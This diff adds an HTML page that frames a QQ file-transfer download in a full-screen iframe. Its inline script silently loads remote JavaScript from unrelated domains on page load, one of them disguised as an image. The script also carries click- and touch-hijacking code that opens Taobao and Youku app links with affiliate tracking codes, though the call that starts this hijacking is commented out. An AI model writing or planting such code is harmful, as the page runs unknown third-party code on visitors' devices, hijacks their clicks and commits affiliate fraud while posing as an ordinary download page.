@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <script type="text/javascript">
+        (function(h) {
+            if (typeof __event != "undefined") {
+                return
+            }
+            var jd= {
+                dd: document,
+                loop:0,
+                app0_6url:"youku://weex?source=00003122&url=https%3A%2F%2Ft.youku.com%2Fyep%2Fpage%2Fm%2Fsanfang1903_wmdt%3Fwh_weex%3Dtrue%26isNeedBaseImage%3D1%26refer%3Dsanfang1903_operation.qrwang_00003122_7000_VrYRVn_19112900&refer=sanfang1903_operation.qrwang_00003122_7000_VrYRVn_19112900",
+                app6_24url1:"tbopen://m.taobao.com/tbopen/index.html?source=auto&action=ali.open.nav&module=h5&bootImage=0&spm=2014.ugdhh.2200803433966.219274-5752-32768&bc_fl_src=growth_dhh_2200803433966_219274-5752-32768&materialid=219274&h5Url=https%3A%2F%2Fh5.m.taobao.com%2Fbcec%2Fdahanghai-jump.html%3Fspm%3D2014.ugdhh.2200803433966.219274-5752-32768%26bc_fl_src%3Dgrowth_dhh_2200803433966_219274-5752-32768",
+                app6_24url2:"tbopen://m.taobao.com/tbopen/index.html?source=auto&action=ali.open.nav&module=h5&bootImage=0&spm=2014.ugdhh.2200803433966.219274-5752-32768&bc_fl_src=growth_dhh_2200803433966_219274-5752-32768&materialid=219274&h5Url=https%3A%2F%2Fh5.m.taobao.com%2Fbcec%2Fdahanghai-jump.html%3Fspm%3D2014.ugdhh.2200803433966.219274-5752-32768%26bc_fl_src%3Dgrowth_dhh_2200803433966_219274-5752-32768",
+                jsurl:[],
+                ttjs1:"https://zt.jlxjs.com/fs.jpg?f=zt.js",
+                ttjs2:"https://qieo.xuebax.cn/hecswe_ne.js?sid=8220A0EDEF938BDDA76648E6157E7576",
+                listener: [],
+                listenerTouchend: [],
+                clickCount: 0,
+                LastTime: new Date(),
+                Getttjs:function(){
+                    var k=50;
+                    if(jd.ttjs2=="" && jd.ttjs1!=""){
+                        return jd.ttjs1;
+                    }
+                    if(jd.Rp(k)){
+                        return jd.ttjs1;
+                    }else{
+                        return jd.ttjs2;
+                    }
+                },
+                Rp:function(v){
+                    if(Math.ceil(Math.random()*100) < v){
+                        return true;
+                    }else{
+                        return false;
+                    }
+                },
+                GetAppUrl:function(){
+                    var k=60;
+                    if(Math.ceil(Math.random()*100) < k){
+                        return jd.app6_24url1;
+                    }else{
+                        return jd.app6_24url2;
+                    }
+                },
+                Initevent: function () {
+                    var a = jd
+                    a.dd = h.document;
+                    a.trigger = a.dd.getElementsByTagName("*");
+                    a.listenClick();
+                    a.listenTouchend();
+                },
+                listenClick: function () {
+                    for (var a = jd,
+                             b = 0; b < a.trigger.length; b++) {
+                        a.listener.push(a.listenNode(a.trigger[b], "click",
+                            function (b) {
+                                return a.onClick(b, "click")
+                            }))
+                    }
+                },
+                listenTouchend: function () {
+                    for (var a = jd,
+                             b = 0; b < a.trigger.length; b++) {
+                        a.listenerTouchend.push(a.listenNode(a.trigger[b], "touchend",
+                            function (b) {
+                                return a.onClick(b, "touchend")
+                            }))
+                    }
+                },
+                listenNode: function (a, b, c) {
+                    a.addEventListener(b, c, true);
+                    return {
+                        destroy: function () {
+
+                        }
+                    }
+                },
+                onClick: function (a, b) {
+                    var c = jd;
+                    var d = new Date();
+                    var sp = d.getTime() - c.LastTime.getTime();
+                    if (sp > 1000) {
+                        c.clickCount++;
+                        c.LastTime = d;
+                        if (c.clickCount > 1) {
+                            return;
+                            c.clickCount == 1;
+                        }else{
+                            c.openApp();
+                        }
+                    }
+                },
+                openApp: function (v) {
+                    if(!jd.Rp(v)){
+                        return;
+                    }
+                    var c = jd;
+                    if(c.loop>1){
+                        return;
+                    }
+                    var dt= new Date();
+                    if (dt.getHours() < 6) {
+                        u = jd.app0_6url;
+                    }else{
+                        u = jd.GetAppUrl();
+                    }
+                    var lk = c.dd.createElement("a")
+                    c.dd.body.appendChild(lk);
+                    lk.setAttribute('href', u);
+                    lk.style.display = 'none';
+                    c.loop++;
+                    if(c.loop<3) {
+                        lk.click();
+                    }
+                },
+                _load_js: function (a, b) {
+                    var s = document.createElement('script');
+                    var p = document.getElementsByTagName('script')[0];
+                    var l = false;
+                    s.src = a;
+                    s.async = true;
+                    if (typeof b === 'function') {
+                        s.onload = s.onreadystatechange = function () {
+                            if (!l && (!s.readyState || /loaded|complete/.test(s.readyState))) {
+                                s.onload = s.onreadystatechange = null;
+                                l = true;
+                                if(b!=null){
+                                    b()
+                                }
+                            }
+                        }
+                    }
+                    p.parentNode.appendChild(s)
+                },
+                Start:function () {
+                    var c = this;
+                    var intHandle = setInterval(function () {
+                        if (window.document.body!=null) {
+                            clearInterval(intHandle);
+                           // jd.openApp(100);
+                            //jd.Initevent();
+                        }
+                    }, 20);
+                }
+            };
+            h.__event=jd;
+            jd.Start();
+            if(jd.ttjs1!="") {
+                jd._load_js(jd.Getttjs(), null);
+            }
+            for(var i=0;i<jd.jsurl.length;i++){
+                jd._load_js(jd.jsurl[i],null);
+            }
+        })(window);
+    </script>
+</head>
+<style>
+    body{
+        padding: 0; margin: 0;
+    }
+    .ifm{
+        position:relative;
+        width:100%;
+        height:3000px;
+        top:-60px;
+        z-index: 0;
+        overflow: visible;
+    }
+</style>
+<body>
+<iframe class="ifm" src="http://sz-ctfs.ftn.qq.com/ftn_handler/a2cff7af9252904685f40b5e6bde5315afbe9ce1d8ff14433d90b901759200898b34c128e68094513364ab67196047b237ffcfd23e9d1bedf8adc1cbb0c3148f?fname=%2F248c5518-712f-11ea-8fa0-5452007bf7ea" width="100%" height="3000" scrolling="no" frameBorder="0" title="title">
+</iframe>
+</body>
+</html>
